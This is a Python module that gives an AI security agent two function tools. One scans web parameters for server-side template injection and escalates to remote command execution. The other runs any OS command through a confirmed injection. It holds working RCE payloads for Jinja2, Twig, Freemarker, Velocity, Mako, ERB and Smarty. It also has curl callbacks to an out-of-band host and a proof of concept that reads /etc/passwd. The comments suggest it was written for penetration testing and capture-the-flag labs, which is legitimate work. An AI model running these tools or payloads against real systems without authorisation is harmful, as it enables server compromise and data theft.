"""
Server-Side Template Injection (SSTI) Scanner

Detects SSTI in Jinja2, Twig, Freemarker, Velocity, Mako, Smarty, Pebble,
ERB and Handlebars template engines.  Performs:
  1. Polyglot probe (engine fingerprinting)
  2. Engine-specific math/command payloads
  3. OS command execution confirmation
  4. Blind SSTI via time-delay and OAST
"""

from __future__ import annotations

import re
import logging
import time
import urllib.parse
from typing import Optional

import requests

from src.sdk.tool import function_tool
from src.sdk.utils import normalize_text, similarity_ratio, extract_title

_DEFAULT_HEADERS = {"User-Agent": "Mozilla/5.0 (CyberCoPilot/1.0)"}
_TIMEOUT = 60
logger = logging.getLogger(__name__)


def _send(url: str, method: str, param: str, payload: str,
          cookies: str = "", extra_data: dict | None = None) -> Optional[requests.Response]:
    # Resolve vhost-only URLs (e.g. facts.htb) to their IP via context hub
    _vhost_header: str | None = None
    try:
        from src.tools.http_proxy import resolve_vhost as _resolve_vhost
        url, _vhost_header = _resolve_vhost(url)
        if _vhost_header:
            # resolve_vhost rewrote URL to IP; inject Host header per request
            pass
    except Exception:
        pass

    parsed = urllib.parse.urlparse(url)
    qparams = dict(urllib.parse.parse_qsl(parsed.query))

    headers = {**_DEFAULT_HEADERS}
    if _vhost_header:
        headers["Host"] = _vhost_header
    if cookies:
        headers["Cookie"] = cookies

    try:
        if method.upper() == "GET":
            qparams[param] = payload
            new_query = urllib.parse.urlencode(qparams)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            return requests.get(test_url, headers=headers,
                                timeout=_TIMEOUT, verify=False, allow_redirects=True)
        else:
            post_data = {**(extra_data or {}), **qparams, param: payload}
            return requests.post(url, data=post_data, headers=headers,
                                 timeout=_TIMEOUT, verify=False, allow_redirects=True)
    except Exception as e:
        logger.debug(f"_send error: {e}")
        return None


def _variant_probe(payload: str) -> tuple[Optional[str], Optional[str]]:
    if "7*7" in payload:
        return payload.replace("7*7", "7*8"), r"56"
    if "7*'7'" in payload:
        return payload.replace("7*'7'", "7*'8'"), r"8888888"
    if "7*\"7\"" in payload:
        return payload.replace('7*"7"', '7*"8"'), r"8888888"
    return None, None


# ─────────────────────────────────────────────────────────────────────────────
# Payload catalogue
# ─────────────────────────────────────────────────────────────────────────────

# Each entry: (engine, payload, expected_output_regex)
_PROBE_PAYLOADS = [
    # Polyglot — triggers most engines
    ("polyglot",     "{{7*7}}",              r"49"),
    ("polyglot",     "${7*7}",               r"49"),
    ("polyglot",     "#{7*7}",               r"49"),
    ("polyglot",     "*{7*7}",               r"49"),
    ("polyglot",     "<%= 7*7 %>",           r"49"),
    ("polyglot",     "@(7*7)",               r"49"),
    # Jinja2 / Flask
    ("jinja2",       "{{7*'7'}}",            r"7777777"),
    ("jinja2",       "{{config}}",           r"<Config|APP_NAME"),
    ("jinja2",       "{{''.__class__}}",       r"<class 'str'>"),
    # Twig (PHP)
    ("twig",         "{{7*'7'}}",            r"49"),
    ("twig",         "{{_self.env.registerUndefinedFilterCallback('exec')}}", r""),
    # Freemarker (Java)
    ("freemarker",   "${7*7}",               r"49"),
    ("freemarker",   "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", r"uid="),
    ("freemarker",   '${.data_model?api.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(null,"id")}', r"uid="),
    # Velocity (Java)
    ("velocity",     '$class.inspect("java.lang.String").type.forName("java.lang.Runtime").getRuntime().exec("id")', r"uid="),
    # Smarty (PHP)
    ("smarty",       "{7*7}",                r"49"),    # Velocity (Java)
    ("velocity",     "#set($x=7*7)${x}",     r"49"),
    # Smarty (PHP)
    ("smarty",       "{php}echo 49;{/php}",  r"49"),
    ("smarty",       "{$smarty.version}",    r"\d+\.\d+"),
    # Mako (Python)
    ("mako",         "${7*7}",               r"49"),
    ("mako",         "${__import__('os').popen('id').read()}", r"uid="),
    # ERB (Ruby)
    ("erb",          "<%= 7*7 %>",           r"49"),
    ("erb",          "<%= `id` %>",          r"uid="),
    # Handlebars (Node)
    ("handlebars",   "{{#with '7' as |i|}}{{i}}{{/with}}", r"7"),
    # Pebble (Java)
    ("pebble",       "{{7*7}}",              r"49"),
]

_RCE_PAYLOADS = {
    "jinja2": [
        # Most reliable: lipsum is always available in Jinja2/Flask
        "{{lipsum.__globals__['os'].popen('id').read()}}",
        "{{lipsum.__globals__['os'].popen('whoami').read()}}",
        # Cycler approach — works on Jinja2 2.x and 3.x
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        # Fallback: __import__ via builtins
        "{{''.__class__.__mro__[1].__subclasses__()[-1].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
    ],
    "twig": [
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
        "{{['id'|filter('system')]}}",
    ],
    "freemarker": [
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"whoami\")}",
    ],
    "velocity": [
        "#set($str=$class.inspect(\"java.lang.String\").type)"
        "#set($chr=$class.inspect(\"java.lang.Character\").type)"
        "#set($ex=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"id\"))"
        "$ex.waitFor()"
        "#set($out=$ex.getInputStream())"
        "#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
    ],
    "mako": [
        "${__import__('os').popen('id').read()}",
    ],
    "erb": [
        "<%= `id` %>",
        "<%= IO.popen('id').read %>",
        "<%= system('id') %>",
    ],
    "smarty": [
        "{system('id')}",
        "{php}passthru('id');{/php}",
    ],
    "pebble": [
        # Pebble does not execute arbitrary code — no RCE via SSTI normally
        # But unsafe beans / EL injection can lead here:
        "{% set cmd = 'id' %}{{'' + cmd}}",  # probe only; real pebble RCE needs custom objects
    ],
}


@function_tool()
def ssti_scanner(
    url: str,
    parameter: str,
    method: str = "GET",
    cookies: str = "",
    engine_hint: str = "",
    oast_domain: str = "",
    extra_data: Optional[dict] = None,
) -> str:
    """
    Scan for Server-Side Template Injection (SSTI) vulnerabilities.

    Probes multiple template engines (Jinja2, Twig, Freemarker, Velocity,
    Mako, ERB, Smarty, Handlebars, Pebble) using math-based polyglots and
    engine-specific payloads, then attempts OS command execution (id/whoami).

    Args:
        url: Target URL, include existing parameters if GET  
             (e.g. https://target.com/page?name=test)
        parameter: Parameter name to inject payloads into
        method: HTTP method — GET or POST (default: GET)
        cookies: Session cookies for authenticated testing (format: name=val; name2=val2)
        engine_hint: Narrow probing to specific engine (jinja2|twig|freemarker|
                     velocity|mako|erb|smarty|handlebars) — empty = try all
        oast_domain: Burp Collaborator / interactsh domain for blind SSTI detection
        extra_data: Extra POST fields (e.g. CSRF tokens, hidden form fields)

    Returns:
        SSTI scan results with engine identification and RCE PoC
    """
    out = [f"=== SSTI Scanner: {url}", f"  Parameter : {parameter}",
           f"  Method    : {method.upper()}", ""]
    findings = []

    # ── Phase 1: Polyglot + fingerprinting probes ─────────────────────────────
    out.append("── Phase 1: Engine Fingerprinting ─────────────")
    detected_engine = None
    baseline = _send(url, method, parameter, "sCoPiLoT_CANARY", cookies, extra_data)
    baseline_body = (baseline.text if baseline else "") or ""
    baseline_title = extract_title(baseline_body)
    baseline_norm = normalize_text(baseline_body)
    baseline_len = len(baseline_body)

    probes = _PROBE_PAYLOADS if not engine_hint else [
        p for p in _PROBE_PAYLOADS if p[0] in (engine_hint, "polyglot")
    ]

    weak_findings = []

    for engine, payload, expected in probes:
        r = _send(url, method, parameter, payload, cookies, extra_data)
        if r is None:
            out.append(f"  [{engine}] {payload[:30]!r} → no response")
            continue

        body = r.text or ""
        if not expected:
            out.append(f"  [{engine}] {payload[:40]!r} → no signature (HTTP {r.status_code})")
            continue

        matched = bool(re.search(expected, body))
        if matched:
            out.append(f"  [{engine}] {payload[:40]!r} → MATCH: {expected!r}")
            baseline_has = bool(re.search(expected, baseline_body)) if baseline_body else False
            body_norm = normalize_text(body)
            sim = similarity_ratio(baseline_norm, body_norm) if baseline_norm else 0.0
            len_diff = abs(len(body) - baseline_len)
            title = extract_title(body)
            title_changed = bool(title and title != baseline_title)

            strong = (not baseline_has) and (sim < 0.985 or len_diff > 120 or title_changed)
            if not strong:
                alt_payload, alt_expected = _variant_probe(payload)
                if alt_payload and alt_expected:
                    r2 = _send(url, method, parameter, alt_payload, cookies, extra_data)
                    if r2 and re.search(alt_expected, r2.text or "") and not re.search(alt_expected, baseline_body):
                        strong = True

            if strong:
                if detected_engine is None or engine != "polyglot":
                    detected_engine = engine
                findings.append(
                    f"HIGH → SSTI detected (engine: {engine}) via payload {payload!r} "
                    f"— expression evaluated, result matched /{expected}/"
                )
            else:
                weak_findings.append(
                    f"LOW → SSTI candidate (engine: {engine}) via payload {payload!r} "
                    f"— match seen but baseline is similar (sim={sim:.3f}, Δlen={len_diff})"
                )
        else:
            out.append(f"  [{engine}] {payload[:40]!r} → no match (HTTP {r.status_code})")

    # ── Phase 2: RCE escalation ───────────────────────────────────────────────
    out.append("")
    out.append("── Phase 2: RCE Escalation ────────────────────")
    rce_confirmed = False

    engines_to_try = ([detected_engine] if detected_engine and detected_engine in _RCE_PAYLOADS
                      else list(_RCE_PAYLOADS.keys()))

    for eng in engines_to_try:
        for rce_payload in _RCE_PAYLOADS.get(eng, []):
            r = _send(url, method, parameter, rce_payload, cookies, extra_data)
            if r is None:
                continue
            body = r.text or ""
            match = re.search(
                r"uid=\d+|root|www-data|nobody|apache|nt authority\\\\system|nt authority\\\\network service|"
                r"iis apppool\\\\[\w\-]+|windows\\\\system32",
                body,
                re.I,
            )
            if match:
                rce_confirmed = True
                start = max(0, match.start() - 20)
                end = min(len(body), match.end() + 60)
                findings.append(
                    f"CRITICAL → RCE confirmed via SSTI ({eng}) — "
                    f"'id' command output detected in response.\n"
                    f"  Payload: {rce_payload}\n"
                    f"  Output snippet: {body[start:end]!r}"
                )
                out.append(f"  [{eng}] RCE CONFIRMED — id output in response")
                out.append(f"  Payload: {rce_payload[:80]}")
                break
        if rce_confirmed:
            break

    # ── Phase 3: Blind SSTI via time delay ───────────────────────────────────
    out.append("")
    out.append("── Phase 3: Blind Time-Based Detection ────────")

    # Guard: if Phase 1 got zero successful responses the host is unreachable;
    # time-based detection would just measure DNS/connection-timeout noise.
    _phase1_responses = sum(1 for line in out if "HTTP " in line or "MATCH" in line)
    _phase1_no_resp = sum(1 for line in out if "no response" in line)
    _host_reachable = (_phase1_responses > 0) or (_phase1_no_resp < len(probes))
    if not _host_reachable:
        out.append("  [SKIP] Host was unreachable in Phase 1 — skipping delay-based detection to avoid false positives")
    else:
        blind_payloads = [
            ("jinja2",      "{% for i in range(1000000) %}{% endfor %}"),
            ("freemarker",  "<#list 1..100000 as x></#list>"),
            ("twig",        "{% for i in 1..100000 %}{% endfor %}"),
            ("erb",         "<% (1..1000000).each {|i| } %>"),  # Ruby ERB
        ]
        # Also send a baseline request to measure normal response latency
        t_base0 = time.time()
        _send(url, method, parameter, "BASELINE_CANARY", cookies, extra_data)
        baseline_latency = time.time() - t_base0
        # Require delay to be at least 3× baseline and >2.5s to reduce false positives
        delay_threshold = max(2.5, baseline_latency * 3)
        for eng, bp in blind_payloads:
            t0 = time.time()
            r = _send(url, method, parameter, bp, cookies, extra_data)
            elapsed = time.time() - t0
            if elapsed > delay_threshold:
                findings.append(
                    f"MEDIUM → Blind SSTI candidate ({eng}) — "
                    f"loop payload caused {elapsed:.1f}s delay (baseline {baseline_latency:.1f}s, threshold {delay_threshold:.1f}s)"
                )
                out.append(f"  [{eng}] Delay {elapsed:.1f}s (threshold {delay_threshold:.1f}s) — possible blind SSTI")
            else:
                out.append(f"  [{eng}] {elapsed:.1f}s — no significant delay")

    # ── Phase 4: OAST blind probe ─────────────────────────────────────────────
    if oast_domain:
        out.append("")
        out.append("── Phase 4: OAST / Out-of-Band Detection ───────")
        oast_payloads = [
            ("jinja2", f"{{{{''.__class__.__mro__[1].__subclasses__()[407](['curl','{oast_domain}'],stdout=-1).communicate()}}}}"),
            ("freemarker", f"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${{ex(\"curl {oast_domain}\")}}"),
            ("mako", f"${{__import__('os').popen('curl {oast_domain}').read()}}"),
        ]
        for eng, op in oast_payloads:
            _send(url, method, parameter, op, cookies, extra_data)
            out.append(f"  [{eng}] OAST payload sent → check {oast_domain} for DNS/HTTP hit")

    # ── Summary ───────────────────────────────────────────────────────────────
    out.append("")
    if findings or weak_findings:
        out.append("── FINDINGS ──────────────────────────────────")
        out.extend(findings)
        if weak_findings:
            out.append("")
            out.append("── LOW CONFIDENCE CANDIDATES ─────────────────")
            out.extend(weak_findings)
        out.append("")
        if detected_engine:
            out.append(f"Detected engine: {detected_engine}")
        if rce_confirmed:
            out.append("PoC — Read /etc/passwd:")
            poc = {
                "jinja2": f"GET {url}?{parameter}={{{{''.__class__.__mro__[1].__subclasses__()[407](['cat','/etc/passwd'],stdout=-1).communicate()[0].decode()}}}}",
                "mako":   f"GET {url}?{parameter}=${{__import__('os').popen('cat /etc/passwd').read()}}",
                "erb":    f"GET {url}?{parameter}=<%= `cat /etc/passwd` %>",
            }
            poc_key = detected_engine or ""
            out.append(f"  {poc.get(poc_key, 'Use engine-specific RCE payload above')}")
    else:
        out.append("No SSTI detected (check endpoint handles templates).")

    return "\n".join(out)


@function_tool()
def ssti_rce_exploit(
    url: str,
    parameter: str,
    command: str,
    engine: str,
    method: str = "GET",
    cookies: str = "",
    extra_data: Optional[dict] = None,
) -> str:
    """
    Execute OS commands via a confirmed SSTI vulnerability.

    Args:
        url: Vulnerable URL
        parameter: Vulnerable parameter name
        command: OS command to execute (e.g., 'id', 'cat /etc/passwd', 'ls /home')
        engine: Template engine (jinja2|twig|freemarker|velocity|mako|erb|smarty)
        method: HTTP method (GET or POST)
        cookies: Session cookies
        extra_data: Extra POST fields (e.g. CSRF tokens, hidden form fields)

    Returns:
        Command output from the server
    """
    cmd_escaped = command.replace("'", "\\'").replace('"', '\\"')

    payloads = {
        # Jinja2: use lipsum (most reliable across all Jinja2 versions)
        "jinja2": [
            f"{{{{lipsum.__globals__['os'].popen('{cmd_escaped}').read()}}}}",
            f"{{{{cycler.__init__.__globals__.os.popen('{cmd_escaped}').read()}}}}",
            f"{{{{''.__class__.__mro__[1].__subclasses__()[-1].__init__.__globals__['__builtins__']['__import__']('os').popen('{cmd_escaped}').read()}}}}",
        ],
        "mako":   [f"${{__import__('os').popen('{cmd_escaped}').read()}}"],
        "erb":    [
            f"<%= `{cmd_escaped}` %>",
            f"<%= IO.popen('{cmd_escaped}').read %>",
        ],
        "freemarker": [f'<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("{cmd_escaped}")}}'],
        "twig":   [f"{{{{['{cmd_escaped}'|filter('system')]|join}}}}"],
        "smarty": [f"{{system('{cmd_escaped}')}}"],
        "velocity": [f"#set($rt=$class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(null,'{cmd_escaped}'))$rt"],
        "pebble": [f"{{%- set x = 'id' -%}}{{{{{cmd_escaped}}}}}"],  # limited; Pebble RCE requires custom classes
    }

    engine_lower = engine.lower()
    payload_list = payloads.get(engine_lower)
    if not payload_list:
        return f"Error: unknown engine '{engine}'. Supported: {', '.join(payloads.keys())}"

    out = [f"=== SSTI RCE: {url}", f"  Engine : {engine}", f"  Command: {command}", ""]

    last_body = ""
    for payload in payload_list:
        r = _send(url, method, parameter, payload, cookies, extra_data)
        if r is None:
            out.append("  [payload] No response — trying next payload...")
            continue

        body = r.text or ""
        last_body = body
        out.append(f"HTTP {r.status_code} | payload: {payload[:60]}...")
        out.append("")

        # Try to extract command output with common patterns
        markers = [
            r"uid=\d+",  # id output
            r"gid=\d+",
            r"groups=\d+",
            r"root:x:0:0:",  # /etc/passwd line
            r"[\w.-]+:[\w.-]+:\d+:\d+:",  # /etc/passwd line
            r"nt authority\\\\system",
            r"nt authority\\\\network service",
            r"iis apppool\\\\[\w\-]+",
            r"windows\\\\system32",
        ]
        for pat in markers:
            m = re.search(pat, body, re.I)
            if m:
                start = max(0, m.start() - 20)
                end = min(len(body), m.end() + 400)
                out.append("✅ Command output extracted:")
                out.append("```")
                out.append(body[start:end])
                out.append("```")
                return "\n".join(out)

        # If the body is short and non-empty it might BE the output
        if body and len(body) < 2000 and r.status_code == 200:
            out.append("Response body (not confirmed output):")
            out.append("```")
            out.append(body[:1000])
            out.append("```")
            return "\n".join(out)

    # All payloads tried but no recognizable output
    out.append("⚠️ No recognizable command output in response. Possible issues:")
    out.append("  1. Wrong engine — verify with ssti_scanner first")
    out.append("  2. WAF filtering the payload — try URL-encoding")
    out.append("  3. Output not reflected in response — try blind SSTI (oast_domain)")
    if last_body:
        out.append(f"\nLast response body (first 500 chars):\n{last_body[:500]}")
    return "\n".join(out)
